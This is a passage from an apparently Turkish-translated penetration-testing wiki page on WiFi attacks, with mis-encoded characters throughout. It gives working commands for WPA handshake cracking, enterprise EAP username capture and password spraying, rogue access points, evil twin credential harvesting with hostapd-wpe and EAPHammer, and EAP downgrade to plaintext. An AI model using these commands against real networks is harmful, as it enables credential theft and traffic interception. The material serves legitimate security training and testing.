aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Dosyada el sÄ±kÄ±ÅŸmasÄ±nÄ± kontrol et

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_EÄŸer bu araÃ§, tamamlanmÄ±ÅŸ bir el sÄ±kÄ±ÅŸmadan Ã¶nce bir ESSID'nin tamamlanmamÄ±ÅŸ el sÄ±kÄ±ÅŸmasÄ±nÄ± bulursa, geÃ§erli olanÄ± tespit edemeyecektir._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

**Kurumsal WiFi kurulumlarÄ±nda, Ã§eÅŸitli kimlik doÄŸrulama yÃ¶ntemleriyle karÅŸÄ±laÅŸacaksÄ±nÄ±z**, her biri farklÄ± gÃ¼venlik seviyeleri ve yÃ¶netim Ã¶zellikleri sunar. `airodump-ng` gibi araÃ§larÄ± kullanarak aÄŸ trafiÄŸini incelediÄŸinizde, bu kimlik doÄŸrulama tÃ¼rleri iÃ§in tanÄ±mlayÄ±cÄ±lar fark edebilirsiniz. BazÄ± yaygÄ±n yÃ¶ntemler ÅŸunlardÄ±r:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
* Bu yÃ¶ntem, EAP-PEAP iÃ§inde donanÄ±m token'larÄ± ve tek kullanÄ±mlÄ±k ÅŸifreleri destekler. MSCHAPv2'nin aksine, bir eÅŸ zorlama kullanmaz ve ÅŸifreleri eriÅŸim noktasÄ±na dÃ¼z metin olarak gÃ¶nderir, bu da gerileme saldÄ±rÄ±larÄ± iÃ§in bir risk oluÅŸturur.
2. **EAP-MD5 (Message Digest 5)**:
* Ä°stemciden ÅŸifrenin MD5 hash'ini gÃ¶ndermeyi iÃ§erir. SÃ¶zlÃ¼k saldÄ±rÄ±larÄ±na karÅŸÄ± savunmasÄ±z olmasÄ±, sunucu kimlik doÄŸrulamasÄ± eksikliÄŸi ve oturum bazlÄ± WEP anahtarlarÄ± oluÅŸturma yeteneÄŸinin olmamasÄ± nedeniyle **tavsiye edilmez**.
3. **EAP-TLS (Transport Layer Security)**:
* Kimlik doÄŸrulama iÃ§in hem istemci tarafÄ± hem de sunucu tarafÄ± sertifikalarÄ±nÄ± kullanÄ±r ve iletiÅŸimleri gÃ¼vence altÄ±na almak iÃ§in kullanÄ±cÄ± bazlÄ± ve oturum bazlÄ± WEP anahtarlarÄ± dinamik olarak oluÅŸturabilir.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
* Åifreli bir tÃ¼nel aracÄ±lÄ±ÄŸÄ±yla karÅŸÄ±lÄ±klÄ± kimlik doÄŸrulama saÄŸlar ve dinamik, kullanÄ±cÄ± bazlÄ±, oturum bazlÄ± WEP anahtarlarÄ±nÄ± tÃ¼retmek iÃ§in bir yÃ¶ntem sunar. Sadece sunucu tarafÄ± sertifikalarÄ± gerektirir, istemciler kimlik bilgilerini kullanÄ±r.
5. **PEAP (Protected Extensible Authentication Protocol)**:
* Korunan iletiÅŸim iÃ§in bir TLS tÃ¼neli oluÅŸturarak EAP ile benzer ÅŸekilde Ã§alÄ±ÅŸÄ±r. TÃ¼nelin saÄŸladÄ±ÄŸÄ± koruma nedeniyle EAP'nin Ã¼stÃ¼nde daha zayÄ±f kimlik doÄŸrulama protokollerinin kullanÄ±lmasÄ±na izin verir.
* **PEAP-MSCHAPv2**: Genellikle PEAP olarak adlandÄ±rÄ±lÄ±r, savunmasÄ±z MSCHAPv2 zorlama/yanÄ±t mekanizmasÄ±nÄ± koruyucu bir TLS tÃ¼neli ile birleÅŸtirir.
* **PEAP-EAP-TLS (veya PEAP-TLS)**: EAP-TLS'ye benzer, ancak sertifikalarÄ± deÄŸiÅŸtirmeden Ã¶nce bir TLS tÃ¼neli baÅŸlatÄ±r ve ek bir gÃ¼venlik katmanÄ± sunar.

Bu kimlik doÄŸrulama yÃ¶ntemleri hakkÄ±nda daha fazla bilgi bulabilirsiniz [burada](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) ve [burada](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### KullanÄ±cÄ± AdÄ± Yakalama

[https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) adresinde okuduÄŸuma gÃ¶re, **EAP** kullanÄ±yorsanÄ±z **"Kimlik"** **mesajlarÄ±nÄ±n** **desteklenmesi** gerekir ve **kullanÄ±cÄ± adÄ±**, **"YanÄ±t KimliÄŸi"** mesajlarÄ±nda **dÃ¼z** olarak gÃ¶nderilecektir.

En gÃ¼venli kimlik doÄŸrulama yÃ¶ntemlerinden biri olan **PEAP-EAP-TLS** kullanÄ±lsa bile, **EAP protokolÃ¼nde gÃ¶nderilen kullanÄ±cÄ± adÄ±nÄ± yakalamak** mÃ¼mkÃ¼ndÃ¼r. Bunu yapmak iÃ§in, **bir kimlik doÄŸrulama iletiÅŸimini yakalayÄ±n** (bir kanalda `airodump-ng` baÅŸlatÄ±n ve aynÄ± arayÃ¼zde `wireshark` kullanÄ±n) ve paketleri `eapol` ile filtreleyin.\
**"YanÄ±t, Kimlik"** paketinin iÃ§inde, istemcinin **kullanÄ±cÄ± adÄ±** gÃ¶rÃ¼necektir.

![](<../../.gitbook/assets/image (850).png>)

### Anonim Kimlikler

Kimlik gizleme, hem EAP-PEAP hem de EAP-TTLS tarafÄ±ndan desteklenmektedir. Bir WiFi aÄŸÄ± baÄŸlamÄ±nda, EAP-Kimlik isteÄŸi genellikle eriÅŸim noktasÄ± (AP) tarafÄ±ndan iliÅŸkilendirme sÃ¼recinde baÅŸlatÄ±lÄ±r. KullanÄ±cÄ± anonimliÄŸinin korunmasÄ±nÄ± saÄŸlamak iÃ§in, kullanÄ±cÄ±nÄ±n cihazÄ±ndaki EAP istemcisinin yanÄ±tÄ±, ilk RADIUS sunucusunun isteÄŸi iÅŸlemek iÃ§in gerekli olan temel bilgileri iÃ§erir. Bu kavram aÅŸaÄŸÄ±daki senaryolarla aÃ§Ä±klanmaktadÄ±r:

* EAP-Kimlik = anonim
* Bu senaryoda, tÃ¼m kullanÄ±cÄ±lar kullanÄ±cÄ± tanÄ±mlayÄ±cÄ±larÄ± olarak takma ad "anonim" kullanÄ±r. Ä°lk RADIUS sunucusu, PEAP veya TTLS protokolÃ¼nÃ¼n sunucu tarafÄ±nÄ± yÃ¶neten bir EAP-PEAP veya EAP-TTLS sunucusu olarak iÅŸlev gÃ¶rÃ¼r. Ä°Ã§ (korunan) kimlik doÄŸrulama yÃ¶ntemi ya yerel olarak ya da uzaktaki (ev) RADIUS sunucusuna devredilir.
* EAP-Kimlik = anonim@realm\_x
* Bu durumda, farklÄ± alanlardan gelen kullanÄ±cÄ±lar kimliklerini gizlerken kendi alanlarÄ±nÄ± belirtirler. Bu, ilk RADIUS sunucusunun EAP-PEAP veya EAP-TTLS isteklerini kendi ev alanlarÄ±ndaki RADIUS sunucularÄ±na proxy olarak iletmesine olanak tanÄ±r; bu sunucular PEAP veya TTLS sunucusu olarak iÅŸlev gÃ¶rÃ¼r. Ä°lk RADIUS sunucusu yalnÄ±zca bir RADIUS iletim dÃ¼ÄŸÃ¼mÃ¼ olarak Ã§alÄ±ÅŸÄ±r.
* Alternatif olarak, ilk RADIUS sunucusu EAP-PEAP veya EAP-TTLS sunucusu olarak iÅŸlev gÃ¶rebilir ve ya korunan kimlik doÄŸrulama yÃ¶ntemini yÃ¶netebilir ya da baÅŸka bir sunucuya iletebilir. Bu seÃ§enek, farklÄ± alanlar iÃ§in ayrÄ± politikalarÄ±n yapÄ±landÄ±rÄ±lmasÄ±nÄ± kolaylaÅŸtÄ±rÄ±r.

EAP-PEAP'te, PEAP sunucusu ile PEAP istemcisi arasÄ±nda TLS tÃ¼neli kurulduktan sonra, PEAP sunucusu bir EAP-Kimlik isteÄŸi baÅŸlatÄ±r ve bunu TLS tÃ¼neli aracÄ±lÄ±ÄŸÄ±yla iletir. Ä°stemci, bu ikinci EAP-Kimlik isteÄŸine, kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸini iÃ§eren bir EAP-Kimlik yanÄ±tÄ± gÃ¶ndererek yanÄ±t verir. Bu yaklaÅŸÄ±m, 802.11 trafiÄŸini dinleyen herhangi birine kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸinin ifÅŸa edilmesini etkili bir ÅŸekilde engeller.

EAP-TTLS, biraz farklÄ± bir prosedÃ¼r izler. EAP-TTLS ile istemci genellikle PAP veya CHAP kullanarak kimlik doÄŸrulamasÄ± yapar, bu da TLS tÃ¼neli ile gÃ¼vence altÄ±na alÄ±nÄ±r. Bu durumda, istemci, tÃ¼nel kurulduktan sonra gÃ¶nderilen ilk TLS mesajÄ±nda bir KullanÄ±cÄ± AdÄ± niteliÄŸi ve ya bir Åifre ya da CHAP-Åifre niteliÄŸi iÃ§erir.

SeÃ§ilen protokolden baÄŸÄ±msÄ±z olarak, PEAP/TTLS sunucusu TLS tÃ¼neli kurulduktan sonra kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸini Ã¶ÄŸrenir. GerÃ§ek kimlik, user@realm veya basitÃ§e user olarak temsil edilebilir. EÄŸer PEAP/TTLS sunucusu aynÄ± zamanda kullanÄ±cÄ±yÄ± kimlik doÄŸrulamakla da sorumluysa, artÄ±k kullanÄ±cÄ±nÄ±n kimliÄŸine sahiptir ve TLS tÃ¼neli ile korunan kimlik doÄŸrulama yÃ¶ntemine devam eder. Alternatif olarak, PEAP/TTLS sunucusu kullanÄ±cÄ±nÄ±n ev RADIUS sunucusuna yeni bir RADIUS isteÄŸi iletebilir. Bu yeni RADIUS isteÄŸi, PEAP veya TTLS protokol katmanÄ±nÄ± atlar. Korunan kimlik doÄŸrulama yÃ¶ntemi EAP olduÄŸunda, iÃ§ EAP mesajlarÄ±, EAP-PEAP veya EAP-TTLS sarmalayÄ±cÄ±sÄ± olmadan ev RADIUS sunucusuna iletilir. Ã‡Ä±kan RADIUS mesajÄ±nÄ±n KullanÄ±cÄ± AdÄ± niteliÄŸi, gelen RADIUS isteÄŸinden alÄ±nan anonim KullanÄ±cÄ± AdÄ± yerine kullanÄ±cÄ±nÄ±n gerÃ§ek kimliÄŸini iÃ§erir. Korunan kimlik doÄŸrulama yÃ¶ntemi PAP veya CHAP (yalnÄ±zca TTLS tarafÄ±ndan desteklenir) olduÄŸunda, TLS yÃ¼kÃ¼nden Ã§Ä±karÄ±lan KullanÄ±cÄ± AdÄ± ve diÄŸer kimlik doÄŸrulama nitelikleri, gelen RADIUS isteÄŸindeki anonim KullanÄ±cÄ± AdÄ± ve TTLS EAP-MesajÄ± niteliklerinin yerini alacak ÅŸekilde Ã§Ä±kan RADIUS mesajÄ±nda deÄŸiÅŸtirilir.

Daha fazla bilgi iÃ§in [https://www.interlinknetworks.com/app\_notes/eap-peap.htm](https://www.interlinknetworks.com/app\_notes/eap-peap.htm) adresine bakÄ±n.

### EAP-Bruteforce (ÅŸifre spreyi)

EÄŸer istemcinin bir **kullanÄ±cÄ± adÄ± ve ÅŸifre** kullanmasÄ± bekleniyorsa (bu durumda **EAP-TLS geÃ§erli olmayacaktÄ±r**), o zaman bir **kullanÄ±cÄ± adÄ±** (bir sonraki bÃ¶lÃ¼me bakÄ±n) ve **ÅŸifreler** listesi almayÄ± deneyebilir ve eriÅŸimi **bruteforce** etmek iÃ§in [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**'Ä±** kullanabilirsiniz.
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Bu saldÄ±rÄ±yÄ± `eaphammer` kullanarak da gerÃ§ekleÅŸtirebilirsiniz:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Client saldÄ±rÄ±larÄ± Teorisi

### AÄŸ SeÃ§imi ve Gezinme

* 802.11 protokolÃ¼, bir istasyonun GeniÅŸletilmiÅŸ Hizmet Seti'ne (ESS) nasÄ±l katÄ±lacaÄŸÄ±nÄ± tanÄ±mlar, ancak bir ESS veya iÃ§indeki bir eriÅŸim noktasÄ±nÄ± (AP) seÃ§me kriterlerini belirtmez.
* Ä°stasyonlar, aynÄ± ESSID'yi paylaÅŸan AP'ler arasÄ±nda gezinebilir, bir bina veya alan boyunca baÄŸlantÄ±yÄ± sÃ¼rdÃ¼rebilir.
* Protokol, istasyonun ESS'e kimlik doÄŸrulamasÄ±nÄ± gerektirir, ancak AP'nin istasyona kimlik doÄŸrulamasÄ±nÄ± zorunlu kÄ±lmaz.

### Tercih Edilen AÄŸ Listeleri (PNL)

* Ä°stasyonlar, baÄŸlandÄ±klarÄ± her kablosuz aÄŸÄ±n ESSID'sini, aÄŸ spesifik yapÄ±landÄ±rma detaylarÄ±yla birlikte Tercih Edilen AÄŸ Listesi'nde (PNL) saklar.
* PNL, bilinen aÄŸlara otomatik olarak baÄŸlanmak iÃ§in kullanÄ±lÄ±r, baÄŸlantÄ± sÃ¼recini kolaylaÅŸtÄ±rarak kullanÄ±cÄ±nÄ±n deneyimini iyileÅŸtirir.

### Pasif Tarama

* AP'ler, varlÄ±klarÄ±nÄ± ve Ã¶zelliklerini duyuran sinyal Ã§erÃ§evelerini periyodik olarak yayÄ±nlar, AP'nin ESSID'sini de iÃ§erir, yayÄ±n kapatÄ±lmadÄ±ÄŸÄ± sÃ¼rece.
* Pasif tarama sÄ±rasÄ±nda, istasyonlar sinyal Ã§erÃ§evelerini dinler. EÄŸer bir sinyalin ESSID'si istasyonun PNL'sindeki bir giriÅŸle eÅŸleÅŸirse, istasyon otomatik olarak o AP'ye baÄŸlanabilir.
* Bir cihazÄ±n PNL'sinin bilgisi, bilinen bir aÄŸÄ±n ESSID'sini taklit ederek potansiyel istismar iÃ§in olanak tanÄ±r ve cihazÄ± sahte bir AP'ye baÄŸlanmaya kandÄ±rÄ±r.

### Aktif Sorgulama

* Aktif sorgulama, istasyonlarÄ±n yakÄ±nlardaki AP'leri ve Ã¶zelliklerini keÅŸfetmek iÃ§in sorgu talepleri gÃ¶ndermesini iÃ§erir.
* YÃ¶nlendirilmiÅŸ sorgu talepleri, belirli bir ESSID'yi hedef alÄ±r ve belirli bir aÄŸÄ±n menzil iÃ§inde olup olmadÄ±ÄŸÄ±nÄ± tespit etmeye yardÄ±mcÄ± olur, hatta gizli bir aÄŸ olsa bile.
* YayÄ±n sorgu talepleri, boÅŸ bir SSID alanÄ±na sahiptir ve tÃ¼m yakÄ±nlardaki AP'lere gÃ¶nderilir, istasyonun PNL iÃ§eriÄŸini aÃ§Ä±klamadan herhangi bir tercih edilen aÄŸÄ± kontrol etmesine olanak tanÄ±r.

## Basit AP ile Ä°nternete YÃ¶nlendirme

Daha karmaÅŸÄ±k saldÄ±rÄ±larÄ± nasÄ±l gerÃ§ekleÅŸtireceÄŸini aÃ§Ä±klamadan Ã¶nce, sadece bir **AP** oluÅŸturmanÄ±n ve **trafik** yÃ¶nlendirmesinin **nasÄ±l** yapÄ±lacaÄŸÄ± aÃ§Ä±klanacaktÄ±r **Ä°nternete** baÄŸlÄ± bir arayÃ¼ze.

`ifconfig -a` kullanarak, AP'yi oluÅŸturmak iÃ§in wlan arayÃ¼zÃ¼nÃ¼n ve Ä°nternete baÄŸlÄ± arayÃ¼zÃ¼n mevcut olup olmadÄ±ÄŸÄ±nÄ± kontrol edin.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
`/etc/dnsmasq.conf` dosyasÄ±nÄ± oluÅŸturun:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Sonra **IP'leri** ve **yollarÄ±** ayarlayÄ±n:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
Ve sonra **dnsmasq'Ä±** baÅŸlatÄ±n:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Bir yapÄ±landÄ±rma dosyasÄ± oluÅŸturun `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**RahatsÄ±z edici sÃ¼reÃ§leri durdurun**, **izleme modunu ayarlayÄ±n** ve **hostapd'yi baÅŸlatÄ±n**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### YÃ¶nlendirme ve YÃ¶nlendirme
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

Evil twin saldÄ±rÄ±sÄ±, WiFi istemcilerinin aÄŸlarÄ± tanÄ±ma ÅŸekillerini istismar eder, esasen aÄŸ adÄ±nÄ± (ESSID) kullanarak, eriÅŸim noktasÄ±nÄ±n istemciye kendini doÄŸrulamasÄ±nÄ± gerektirmeden. Anahtar noktalar ÅŸunlardÄ±r:

* **AyrÄ±m ZorluÄŸu**: Cihazlar, aynÄ± ESSID ve ÅŸifreleme tÃ¼rÃ¼nÃ¼ paylaÅŸtÄ±klarÄ±nda meÅŸru ve sahte eriÅŸim noktalarÄ±nÄ± ayÄ±rt etmekte zorlanÄ±r. GerÃ§ek dÃ¼nya aÄŸlarÄ± genellikle kapsama alanÄ±nÄ± kesintisiz uzatmak iÃ§in aynÄ± ESSID'ye sahip birden fazla eriÅŸim noktasÄ± kullanÄ±r.
* **Ä°stemci GeÃ§iÅŸi ve BaÄŸlantÄ± ManipÃ¼lasyonu**: 802.11 protokolÃ¼, cihazlarÄ±n aynÄ± ESS iÃ§indeki eriÅŸim noktalarÄ± arasÄ±nda geÃ§iÅŸ yapmasÄ±na olanak tanÄ±r. SaldÄ±rganlar, bir cihazÄ± mevcut baz istasyonundan ayÄ±rÄ±p sahte birine baÄŸlanmaya ikna ederek bunu istismar edebilir. Bu, daha gÃ¼Ã§lÃ¼ bir sinyal sunarak veya meÅŸru eriÅŸim noktasÄ±na olan baÄŸlantÄ±yÄ± deauthentikasyon paketleri veya sinyal karÄ±ÅŸtÄ±rma gibi yÃ¶ntemlerle keserek gerÃ§ekleÅŸtirilebilir.
* **Uygulama ZorluklarÄ±**: Birden fazla, iyi yerleÅŸtirilmiÅŸ eriÅŸim noktasÄ±nÄ±n bulunduÄŸu ortamlarda evil twin saldÄ±rÄ±sÄ±nÄ± baÅŸarÄ±yla gerÃ§ekleÅŸtirmek zor olabilir. Tek bir meÅŸru eriÅŸim noktasÄ±nÄ± deauthentikasyon yapmak, genellikle cihazÄ±n baÅŸka bir meÅŸru eriÅŸim noktasÄ±na baÄŸlanmasÄ±na neden olur, saldÄ±rgan tÃ¼m yakÄ±n eriÅŸim noktalarÄ±nÄ± deauthentikasyon yapmadÄ±kÃ§a veya sahte eriÅŸim noktasÄ±nÄ± stratejik olarak yerleÅŸtirmedikÃ§e.

Ã‡ok temel bir Open Evil Twin (Ä°nternete trafik yÃ¶nlendirme yeteneÄŸi olmayan) oluÅŸturabilirsiniz:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Evil Twin oluÅŸturmak iÃ§in **eaphammer** kullanabilirsiniz (evil twin'ler oluÅŸturmak iÃ§in eaphammer ile arayÃ¼zÃ¼n **monitor** modunda **olmamasÄ± gerektiÄŸini** unutmayÄ±n):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Or using Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../.gitbook/assets/image (1088).png>)

LÃ¼tfen, varsayÄ±lan olarak PNL'deki bir ESSID WPA korumalÄ± olarak kaydedilmiÅŸse, cihazÄ±n otomatik olarak AÃ§Ä±k bir evil Twin'e baÄŸlanmayacaÄŸÄ±nÄ± unutmayÄ±n. GerÃ§ek AP'yi DoS yapmayÄ± deneyebilir ve kullanÄ±cÄ±nÄ±n manuel olarak AÃ§Ä±k evil twin'inize baÄŸlanmasÄ±nÄ± umabilirsiniz, ya da gerÃ§ek AP'yi DoS yapabilir ve el sÄ±kÄ±ÅŸmayÄ± yakalamak iÃ§in bir WPA Evil Twin kullanabilirsiniz (bu yÃ¶ntemi kullanarak kurbanÄ±n size baÄŸlanmasÄ±nÄ± saÄŸlayamazsÄ±nÄ±z Ã§Ã¼nkÃ¼ PSK'yÄ± bilmiyorsunuz, ancak el sÄ±kÄ±ÅŸmayÄ± yakalayabilir ve kÄ±rmaya Ã§alÄ±ÅŸabilirsiniz).

_BazÄ± iÅŸletim sistemleri ve antivirÃ¼s yazÄ±lÄ±mlarÄ±, AÃ§Ä±k bir aÄŸa baÄŸlanmanÄ±n tehlikeli olduÄŸunu kullanÄ±cÄ±ya bildirecektir..._

### WPA/WPA2 Evil Twin

**WPA/2 kullanarak bir Evil Twin oluÅŸturabilirsiniz** ve eÄŸer cihazlar o SSID'ye WPA/2 ile baÄŸlanacak ÅŸekilde yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, baÄŸlanmaya Ã§alÄ±ÅŸacaklardÄ±r. Her durumda, **4-yol el sÄ±kÄ±ÅŸmasÄ±nÄ± tamamlamak iÃ§in** ayrÄ±ca **mÃ¼ÅŸterinin kullanacaÄŸÄ±** **ÅŸifreyi** de **bilmeniz** gerekiyor. EÄŸer **bilmiyorsanÄ±z**, **baÄŸlantÄ± tamamlanmayacaktÄ±r**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Bu saldÄ±rÄ±larÄ± anlamak iÃ§in Ã¶ncelikle [WPA Enterprise aÃ§Ä±klamasÄ±](./#wpa-enterprise-mgt) okunmasÄ±nÄ± Ã¶neririm.

**hostapd-wpe KullanÄ±mÄ±**

`hostapd-wpe` Ã§alÄ±ÅŸmak iÃ§in bir **konfigÃ¼rasyon** dosyasÄ±na ihtiyaÃ§ duyar. Bu konfigÃ¼rasyonlarÄ±n oluÅŸturulmasÄ±nÄ± **otomatikleÅŸtirmek** iÃ§in [https://github.com/WJDigby/apd\_launchpad](https://github.com/WJDigby/apd\_launchpad) kullanÄ±labilir (/_/etc/hostapd-wpe/_ iÃ§indeki python dosyasÄ±nÄ± indirin).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
YapÄ±landÄ±rma dosyasÄ±nda ssid, kanal, kullanÄ±cÄ± dosyalarÄ±, cret/key, dh parametreleri, wpa versiyonu ve kimlik doÄŸrulama gibi birÃ§ok farklÄ± ÅŸeyi seÃ§ebilirsiniz...

[**Herhangi bir sertifikanÄ±n giriÅŸ yapmasÄ±na izin vermek iÃ§in EAP-TLS ile hostapd-wpe kullanma.**](evil-twin-eap-tls.md)

**EAPHammer KullanÄ±mÄ±**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
VarsayÄ±lan olarak, EAPHammer bu kimlik doÄŸrulama yÃ¶ntemlerini amaÃ§lar (ilk olarak dÃ¼z metin ÅŸifrelerini elde etmeye Ã§alÄ±ÅŸmak iÃ§in GTC'yi ve ardÄ±ndan daha saÄŸlam kimlik doÄŸrulama yÃ¶ntemlerinin kullanÄ±lmasÄ±nÄ± dikkate alarak):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
Bu, uzun baÄŸlantÄ± sÃ¼relerini Ã¶nlemek iÃ§in varsayÄ±lan metodolojidir. Ancak, sunucuya kimlik doÄŸrulama yÃ¶ntemlerini en zayÄ±ftan en gÃ¼Ã§lÃ¼sÃ¼ne doÄŸru belirtmek de mÃ¼mkÃ¼ndÃ¼r:
```
--negotiate weakest
```
Or you could also use:

* `--negotiate gtc-downgrade` ile yÃ¼ksek verimli GTC dÃ¼ÅŸÃ¼rme uygulamasÄ±nÄ± (dÃ¼z metin ÅŸifreleri) kullanmak iÃ§in
* `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` ile sunulan yÃ¶ntemleri manuel olarak belirtmek iÃ§in (saldÄ±rÄ±nÄ±n gerÃ§ekleÅŸtirileceÄŸi organizasyonla aynÄ± sÄ±rada aynÄ± kimlik doÄŸrulama yÃ¶ntemlerini sunmak, tespiti Ã§ok daha zor hale getirecektir).
* [Daha fazla bilgi iÃ§in wiki'yi bulun](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

**Airgeddon KullanÄ±mÄ±**

`Airgeddon`, daha Ã¶nce oluÅŸturulmuÅŸ sertifikalarÄ± kullanarak WPA/WPA2-Enterprise aÄŸlarÄ±na EAP kimlik doÄŸrulamasÄ± sunabilir. Sahte aÄŸ, baÄŸlantÄ± protokolÃ¼nÃ¼ EAP-MD5'e dÃ¼ÅŸÃ¼recektir, bÃ¶ylece **kullanÄ±cÄ±yÄ± ve ÅŸifrenin MD5'ini yakalayabilecektir**. Daha sonra, saldÄ±rgan ÅŸifreyi kÄ±rmaya Ã§alÄ±ÅŸabilir.\
`Airgeddon`, size **sÃ¼rekli KÃ¶tÃ¼ Ä°kiz saldÄ±rÄ±sÄ± (gÃ¼rÃ¼ltÃ¼lÃ¼)** veya **birisi baÄŸlanana kadar yalnÄ±zca KÃ¶tÃ¼ SaldÄ±rÄ± oluÅŸturma (sakin)** olanaÄŸÄ±nÄ± sunar.

![](<../../.gitbook/assets/image (936).png>)

### KÃ¶tÃ¼ Ä°kiz saldÄ±rÄ±larÄ±nda PEAP ve EAP-TTLS TLS tÃ¼nellerini hata ayÄ±klama

_Bu yÃ¶ntem bir PEAP baÄŸlantÄ±sÄ±nda test edildi, ancak ben keyfi bir TLS tÃ¼nelini ÅŸifrelediÄŸim iÃ§in bu EAP-TTLS ile de Ã§alÄ±ÅŸmalÄ±dÄ±r._

**hostapd-wpe**'nin **konfigÃ¼rasyonu** iÃ§inde, _**dh\_file**_ iÃ§eren satÄ±rÄ± **yorumlayÄ±n** ( `dh_file=/etc/hostapd-wpe/certs/dh`'den `#dh_file=/etc/hostapd-wpe/certs/dh`'ye)\
Bu, `hostapd-wpe`'nin **RSA kullanarak anahtarlarÄ± deÄŸiÅŸtirmesini** saÄŸlayacak, bÃ¶ylece daha sonra **sunucunun Ã¶zel anahtarÄ±nÄ± bilerek** trafiÄŸi **ÅŸifreleyebilirsiniz**.

Åimdi, her zamanki gibi o deÄŸiÅŸtirilmiÅŸ konfigÃ¼rasyonla **`hostapd-wpe`** kullanarak **KÃ¶tÃ¼ Ä°kiz**'i baÅŸlatÄ±n. AyrÄ±ca, **KÃ¶tÃ¼ Ä°kiz saldÄ±rÄ±sÄ±nÄ±** gerÃ§ekleÅŸtiren **arayÃ¼zde** **`wireshark`**'Ä± baÅŸlatÄ±n.

Åimdi veya daha sonra (zaten bazÄ± kimlik doÄŸrulama giriÅŸimlerini yakaladÄ±ÄŸÄ±nÄ±zda) Ã¶zel RSA anahtarÄ±nÄ± wireshark'a ekleyebilirsiniz: `DÃ¼zenle --> Tercihler --> Protokoller --> TLS --> (RSA anahtarlarÄ± listesi) DÃ¼zenle...`

Yeni bir giriÅŸ ekleyin ve bu deÄŸerlerle formu doldurun: **IP adresi = herhangi** -- **Port = 0** -- **Protokol = veri** -- **Anahtar DosyasÄ±** (**anahtar dosyanÄ±zÄ± seÃ§in**, sorun yaÅŸamamak iÃ§in **ÅŸifre korumalÄ± olmayan** bir anahtar dosyasÄ± seÃ§in).

![](<../../.gitbook/assets/image (687).png>)

Ve yeni **"ÅifrelenmiÅŸ TLS" sekmesine** bakÄ±n:

![](<../../.gitbook/assets/image (231).png>)

## KARMA, MANA, GÃ¼rÃ¼ltÃ¼lÃ¼ MANA ve Bilinen Beacon saldÄ±rÄ±sÄ±

### ESSID ve MAC kara/beyaz listeleri

FarklÄ± tÃ¼rdeki Medya EriÅŸim Kontrol Filtre Listeleri (MFACL'ler) ve bunlarÄ±n sahte EriÅŸim NoktasÄ± (AP) Ã¼zerindeki davranÄ±ÅŸlarÄ± Ã¼zerindeki etkileri:

1. **MAC tabanlÄ± Beyaz Liste**:
* Sahte AP, yalnÄ±zca beyaz listede belirtilen cihazlardan gelen sorgu isteklerine yanÄ±t verecek, listede olmayan diÄŸer tÃ¼m cihazlara gÃ¶rÃ¼nmez kalacaktÄ±r.
2. **MAC tabanlÄ± Kara Liste**:
* Sahte AP, kara listedeki cihazlardan gelen sorgu isteklerini gÃ¶rmezden gelecek, bÃ¶ylece sahte AP bu belirli cihazlara gÃ¶rÃ¼nmez hale gelecektir.
